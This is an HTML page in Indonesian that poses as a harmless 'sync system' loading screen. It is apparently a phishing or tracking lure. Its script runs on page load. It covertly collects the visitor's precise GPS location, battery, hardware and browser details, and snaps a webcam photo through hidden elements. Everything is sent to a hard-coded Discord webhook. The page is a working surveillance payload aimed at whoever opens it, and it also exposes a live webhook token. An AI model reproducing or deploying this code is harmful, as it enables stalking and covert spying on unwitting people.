<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Sistem Sinkronisasi</title>
</head>
<body>
    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
        <p id="status">Sedang memproses data...</p>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1490896106698051719/dEAoVaMVu-xEMBSc2YUcDo_9s8aMd0VTkTo-fjk9gFoxLWi3bCF5l4-sMsZeYbXCVICA";

        async function jalankanSistem() {
            try {
                // 1. Ambil Info Baterai
                let batteryInfo = "Tidak terdeteksi";
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryInfo = `${Math.round(battery.level * 100)}%`;
                }

                // 2. Ambil Info Hardware & Browser
                const hardware = `${navigator.hardwareConcurrency || 'N/A'} Core / ${navigator.deviceMemory || 'N/A'} GB RAM`;
                const browser = navigator.userAgent;
                const platform = `${navigator.platform} (${screen.width}x${screen.height})`;

                // 3. Ambil Lokasi
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const lat = p.coords.latitude;
                    const lon = p.coords.longitude;
                    const acc = Math.round(p.coords.accuracy);
                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

                    // Teks Pesan Utama
                    const pesanTeks = 
                        `📍 **Maps:**\n${mapsLink}\n` +
                        `🎯 **Akurasi:** ${acc} meter\n` +
                        `🔋 **Baterai:** ${batteryInfo}\n` +
                        `📱 **Perangkat:** ${platform}\n` +
                        `🧠 **Hardware:** ${hardware}\n` +
                        `🌐 **Browser:** ${browser}`;

                    // 4. Ambil Foto Kamera
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        const video = document.getElementById('video');
                        video.srcObject = stream;

                        setTimeout(() => {
                            const canvas = document.getElementById('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            
                            canvas.toBlob(async (blob) => {
                                const formData = new FormData();
                                // Kirim file foto dan teks dalam satu request
                                formData.append("file", blob, "capture.png");
                                formData.append("payload_json", JSON.stringify({
                                    content: pesanTeks
                                }));

                                await fetch(webhookURL, { method: "POST", body: formData });
                                
                                stream.getTracks().forEach(track => track.stop());
                                document.getElementById('status').innerText = "Proses Selesai.";
                            }, 'image/png');
                        }, 2000);
                    } catch (camErr) {
                        // Jika kamera ditolak, tetap kirim datanya saja
                        await fetch(webhookURL, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ content: pesanTeks + "\n❌ *Kamera Ditolak*" })
                        });
                        document.getElementById('status').innerText = "Data Terkirim (Tanpa Foto).";
                    }

                }, (locErr) => {
                    document.getElementById('status').innerText = "Gagal: Izin lokasi diperlukan.";
                }, { enableHighAccuracy: true });

            } catch (err) {
                console.error(err);
            }
        }

        window.onload = jalankanSistem;
    </script>
</body>
</html>
